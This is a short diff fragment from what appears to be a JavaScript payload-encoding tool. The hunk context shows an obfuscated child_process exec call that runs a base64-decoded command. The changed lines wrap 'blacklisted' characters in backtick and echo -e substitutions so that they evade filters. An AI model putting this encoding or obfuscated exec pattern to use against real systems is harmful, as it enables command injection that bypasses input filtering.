@@ -217,7 +217,7 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
         str_array.forEach(
             function (one) {
                 if (one.match(regex_black_chars) && one != "") {
-                    one = one.replace(regex_black_chars, "\"`$&`echo -e\""); // $& 是被匹配的字符串本身
+                    one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& 是被匹配的字符串本身
                 } else {
                     one = ascii_2_Hex(one);
                 }
